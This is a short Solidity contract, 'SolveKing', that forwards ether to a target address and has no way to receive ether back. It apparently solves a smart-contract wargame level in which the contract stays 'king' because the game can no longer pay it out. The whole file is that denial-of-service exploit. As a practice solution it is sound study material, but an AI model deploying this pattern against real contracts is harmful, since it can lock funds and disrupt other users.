// SPDX-License-Identifier: GPL-3.0

pragma solidity ^0.8.3;

contract SolveKing {
  constructor() payable {}

  function transfer(address target) public payable {
    bytes memory x;
    (bool success, ) = target.call{ value: msg.value }(x);
    require(success, "call not success");
  }
}
